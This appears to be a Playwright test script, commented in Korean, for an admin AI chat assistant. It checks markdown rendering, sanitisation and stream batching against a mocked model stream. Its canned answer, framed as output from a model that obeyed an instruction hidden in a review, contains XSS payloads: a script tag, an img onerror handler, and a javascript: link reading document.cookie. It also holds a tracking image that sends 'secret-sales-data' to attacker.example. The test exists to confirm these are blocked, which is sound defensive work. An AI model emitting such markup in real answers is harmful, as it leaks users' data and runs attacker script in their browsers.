#!/usr/bin/env node
/**
 * 마크다운 렌더링·보안·프레임 배칭 확인(04-ai-chat-ux ⑥). LLM 을 부르지 않는다 —
 * 페이지 안에서 스트림 요청만 가로채 **정해 둔 프레임을 시간 간격을 두고** 흘려보낸다(실제 SSE 처럼 조각조각 도착).
 *
 *  A) 렌더링 + 보안: 표·목록·굵게가 실제 요소로 그려지는가 / `<script>`·`<img onerror>`·마크다운 이미지·`javascript:` 링크가
 *     든 답변에서 **스크립트가 실행되지 않고, 외부로 요청이 하나도 나가지 않는가**(Network 를 스크립트로 본다)
 *  B) 배칭: 델타 N 개가 빠르게 올 때 화면 갱신 횟수가 델타 수가 아니라 프레임 수에 묶이는가, 글자가 빠지지 않는가, 긴 작업(long task)
 *
 * 실행: node scripts/ai-chat/verify-markdown.mjs --out <폴더> [--base http://localhost:3000] [--json out.json]
 */
import { chromium } from 'playwright-core';
import { mkdirSync, writeFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { join } from 'node:path';
import { loginAsDemoAdmin } from '../a11y/lib.mjs';

const args = { base: 'http://localhost:3000', out: '.', json: null };
const argv = process.argv.slice(2);
for (let i = 0; i < argv.length; i += 2) args[argv[i].slice(2)] = argv[i + 1];
mkdirSync(args.out, { recursive: true });
const ATTACKER = 'attacker.example';
const AXE_PATH = createRequire(import.meta.url).resolve('axe-core/axe.min.js');

const browser = await chromium.launch({ channel: 'chrome', headless: true });
const context = await browser.newContext({ viewport: { width: 1280, height: 900 }, locale: 'ko-KR' });
await context.route(/\/monitoring(\?|$)|sentry\.io/, (route) => route.abort());
// 공격자 주소로 가는 요청은 실제로 내보내지 않되, 시도 자체는 아래 request 이벤트로 잡는다
await context.route(new RegExp(ATTACKER.replace('.', '\\.')), (route) => route.abort());
await context.addInitScript(installMockStream);
const page = await context.newPage();

const requests = [];
page.on('request', (req) => requests.push({ url: req.url(), type: req.resourceType() }));
const dialogs = [];
page.on('dialog', (d) => {
  dialogs.push(d.message());
  d.dismiss();
});

await loginAsDemoAdmin(page, args.base);

// ── A) 렌더링 + 보안 ─────────────────────────────────────────────────────────
const markdown = [
  '## 2026년 9월 매출 요약',
  '',
  '지난달 매출은 **3,240,000원**이며 주문은 *42건*입니다.',
  '',
  '| 일자 | 주문 | 매출 |',
  '|------|-----:|-----:|',
  '| 9/1 | 12 | 840,000원 |',
  '| 9/2 | 30 | 2,400,000원 |',
  '',
  '주요 원인:',
  '',
  '- 배송 지연 문의 증가',
  '- 사이즈 불만',
  '  - 신발 카테고리',
  '',
  '1. 첫째',
  '2. 둘째',
  '',
  '- [x] 완료한 일',
  '- [ ] 남은 일',
  '',
  '참고: [정상 링크](https://example.com/report) · `get_sales_summary`',
  '',
  // ↓ 리뷰 본문에 숨겨진 지시를 모델이 따랐다고 가정한 출력
  '<script>window.__xss = "script"</script>',
  '',
  '<img src="x" onerror="window.__xss = \'onerror\'">',
  '',
  `![추적 픽셀](https://${ATTACKER}/collect?d=secret-sales-data)`,
  '',
  `<img src="https://${ATTACKER}/raw-html.png">`,
  '',
  '[위험한 링크](javascript:alert(document.cookie))',
  '',
  '끝.',
].join('\n');

await fresh();
requests.length = 0;
await ask('마크다운 테스트', chunk(markdown, 9), 8);
const a = await page.evaluate(() => {
  const bubbles = [...document.querySelectorAll('main div.self-start')];
  const bubble = bubbles[bubbles.length - 1];
  const links = [...bubble.querySelectorAll('a')].map((el) => ({
    text: el.textContent,
    href: el.getAttribute('href'),
    rel: el.getAttribute('rel'),
    target: el.getAttribute('target'),
  }));
  return {
    tables: bubble.querySelectorAll('table').length,
    headerCells: bubble.querySelectorAll('th').length,
    bodyCells: bubble.querySelectorAll('td').length,
    strong: [...bubble.querySelectorAll('strong')].map((el) => el.textContent),
    em: bubble.querySelectorAll('em').length,
    listItems: bubble.querySelectorAll('li').length,
    nestedLists: bubble.querySelectorAll('ul ul').length,
    orderedLists: bubble.querySelectorAll('ol').length,
    inputElements: bubble.querySelectorAll('input').length,
    checklistMarks: [...bubble.querySelectorAll('[role="img"]')].map((el) => el.getAttribute('aria-label')),
    headings: [...bubble.querySelectorAll('h1,h2,h3,h4,h5')].map((el) => el.tagName.toLowerCase()),
    inlineCode: [...bubble.querySelectorAll('code')].map((el) => el.textContent),
    links,
    emptyHrefLinks: links.filter((l) => !l.href).length, // javascript: 주소는 링크가 아니라 글자로 남아야 한다
    dangerousTextKept: bubble.textContent.includes('위험한 링크'),
    // 보안
    imgElements: bubble.querySelectorAll('img').length,
    scriptElements: bubble.querySelectorAll('script').length,
    xssFlag: window.__xss ?? null,
    imageAltShown: bubble.textContent.includes('[이미지: 추적 픽셀]'),
    rawPipesLeft: bubble.textContent.includes('|---'), // 표 문법이 글자로 남아 있으면 렌더링 실패
    rawStarsLeft: bubble.textContent.includes('**'),
    endReached: bubble.textContent.trim().endsWith('끝.'),
  };
});
a.requestsToAttacker = requests.filter((r) => r.url.includes(ATTACKER)).map((r) => r.url);
a.imageRequestsDuringAnswer = requests.filter((r) => r.type === 'image').map((r) => r.url);
a.dialogs = [...dialogs];
await page.screenshot({ path: join(args.out, 'markdown.png'), animations: 'disabled' });
// 표·목록·링크가 든 답변 화면의 axe(WCAG 2.1 A/AA) — 측정 뒤에 주입한다(위의 요청 기록에 섞이지 않게)
await page.addScriptTag({ path: AXE_PATH });
a.axeViolations = await page.evaluate(async () => {
  // eslint-disable-next-line no-undef
  const res = await axe.run(document, {
    runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'] },
    resultTypes: ['violations'],
  });
  return res.violations.map((v) => ({ id: v.id, impact: v.impact, nodes: v.nodes.map((n) => n.html.slice(0, 120)) }));
});

// ── B) 배칭 ──────────────────────────────────────────────────────────────────
const sentences = Array.from({ length: 120 }, (_, i) => `${i + 1}번째 문장입니다. **강조 ${i + 1}** 과 목록이 이어집니다.\n\n- 항목 ${i + 1}\n\n`);
const longText = sentences.join('') + '| 열1 | 열2 |\n|---|---|\n| a | b |\n\n마지막 문장.';
const deltas = chunk(longText, 12);
await fresh();
await page.evaluate(() => window.__renderProbe.start());
await ask('긴 답변 테스트', deltas, 16, 8); // 16ms 마다 8조각씩
const b = await page.evaluate(() => window.__renderProbe.stop());
b.deltas = deltas.length;
b.expectedChars = longText.length;
b.lastSentenceShown = await page.getByText('마지막 문장.').count();
b.lastListItemShown = await page.getByText('항목 120', { exact: true }).count();
await page.screenshot({ path: join(args.out, 'long-answer.png'), animations: 'disabled' });

await browser.close();

const result = { measuredAt: new Date().toISOString(), base: args.base, rendering: a, batching: b };
console.log(JSON.stringify(result, null, 2));
if (args.json) writeFileSync(args.json, JSON.stringify(result, null, 2));

const secure =
  a.imgElements === 0 &&
  a.scriptElements === 0 &&
  a.xssFlag === null &&
  a.requestsToAttacker.length === 0 &&
  a.dialogs.length === 0 &&
  a.emptyHrefLinks === 0;
const accessible = a.axeViolations.length === 0;
const rendered = a.tables === 1 && a.strong.length > 0 && a.listItems >= 7 && !a.rawPipesLeft && !a.rawStarsLeft && a.endReached;
console.log(`\n렌더링: ${rendered ? '통과' : '실패'} · 보안(요청·실행 없음): ${secure ? '통과' : '실패'} · axe 위반 ${a.axeViolations.length}건`);
console.log(`배칭: 델타 ${b.deltas}개 → 화면 갱신 ${b.commits}회 (${b.durationMs}ms 동안, 프레임 약 ${b.frames}개) · long task ${b.longTasks}개(최대 ${b.maxLongTaskMs}ms)`);
process.exit(rendered && secure && accessible ? 0 : 1);

// ─────────────────────────────────────────────────────────────────────────────

async function fresh() {
  await page.evaluate(() => localStorage.removeItem('assistant_conversation_id'));
  await page.goto(`${args.base}/admin/assistant`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(800);
}

/** 가짜 스트림을 걸고 질문을 보낸 뒤 끝날 때까지 기다린다 */
async function ask(question, textDeltas, intervalMs, burst = 1) {
  await page.evaluate(
    ({ textDeltas, intervalMs, burst }) => {
      window.__mockStream = {
        intervalMs,
        burst,
        frames: [
          { type: 'meta', conversationId: '999999' },
          { type: 'tool', name: 'get_sales_summary' },
          ...textDeltas.map((delta) => ({ type: 'text', delta })),
          { type: 'done' },
        ],
      };
    },
    { textDeltas, intervalMs, burst },
  );
  const input = page.locator('textarea').first();
  await input.fill(question);
  await input.press('Enter');
  const stop = page.getByRole('button', { name: '중지' });
  await stop.waitFor({ state: 'visible', timeout: 10000 });
  await stop.waitFor({ state: 'hidden', timeout: 60000 });
  await page.waitForTimeout(400);
}

function chunk(text, size) {
  const out = [];
  for (let i = 0; i < text.length; i += size) out.push(text.slice(i, i + size));
  return out;
}

/** 브라우저 안에서 실행 — 스트림 요청을 가로채 프레임을 간격을 두고 흘리고, 화면 갱신 횟수를 센다 */
function installMockStream() {
  const realFetch = window.fetch.bind(window);
  window.fetch = async (...a) => {
    const url = typeof a[0] === 'string' ? a[0] : a[0]?.url ?? '';
    if (url.includes('/admin/assistant/stream/cancel')) return new Response(null, { status: 204 });
    if (!url.includes('/admin/assistant/stream') || !window.__mockStream) return realFetch(...a);
    const { frames, intervalMs, burst } = window.__mockStream;
    const encoder = new TextEncoder();
    let i = 0;
    // 한 번에 burst 개씩 따로따로 넣는다 — 실제 네트워크처럼 여러 조각이 한꺼번에 몰려오는 상황
    const body = new ReadableStream({
      async pull(controller) {
        if (i >= frames.length) return controller.close();
        await new Promise((r) => setTimeout(r, intervalMs));
        for (let n = 0; n < burst && i < frames.length; n++) {
          controller.enqueue(encoder.encode(`data: ${JSON.stringify(frames[i++])}\n\n`));
        }
      },
    });
    return new Response(body, { status: 201, headers: { 'Content-Type': 'text/event-stream' } });
  };

  // 화면 갱신(React 커밋) 횟수 = 채팅 영역의 DOM 변경 묶음 수. 프레임 수와 긴 작업도 함께 센다.
  let observer, longTaskObserver, raf, state;
  window.__renderProbe = {
    start() {
      state = { commits: 0, frames: 0, longTasks: 0, maxLongTaskMs: 0, t0: performance.now() };
      observer = new MutationObserver(() => (state.commits += 1));
      observer.observe(document.querySelector('main') ?? document.body, { childList: true, subtree: true, characterData: true });
      longTaskObserver = new PerformanceObserver((list) => {
        for (const e of list.getEntries()) {
          state.longTasks += 1;
          state.maxLongTaskMs = Math.max(state.maxLongTaskMs, Math.round(e.duration));
        }
      });
      longTaskObserver.observe({ entryTypes: ['longtask'] });
      const tick = () => {
        state.frames += 1;
        raf = requestAnimationFrame(tick);
      };
      raf = requestAnimationFrame(tick);
    },
    stop() {
      observer.disconnect();
      longTaskObserver.disconnect();
      cancelAnimationFrame(raf);
      return { ...state, durationMs: Math.round(performance.now() - state.t0), t0: undefined };
    },
  };
}
